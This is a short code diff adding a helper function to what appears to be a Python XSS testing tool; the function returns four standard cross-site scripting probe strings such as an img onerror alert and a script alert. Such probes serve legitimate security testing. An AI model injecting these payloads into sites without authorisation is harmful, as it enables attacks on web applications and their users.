@@ -254,6 +254,15 @@ class Payloads:
             self.add_payload(payload_str, ptype, enc)
         self.logger.info("Default payloads added")
 
+def get_default_payloads() -> List[str]:
+    """Return a list of default XSS payload strings."""
+    return [
+        "<img src=x onerror=alert(1)>",
+        "<script>alert(1)</script>",
+        "javascript:alert(1)",
+        "alert(1)"
+    ]
+
 if __name__ == "__main__":
     # Test the Payloads class
     payloads = Payloads()
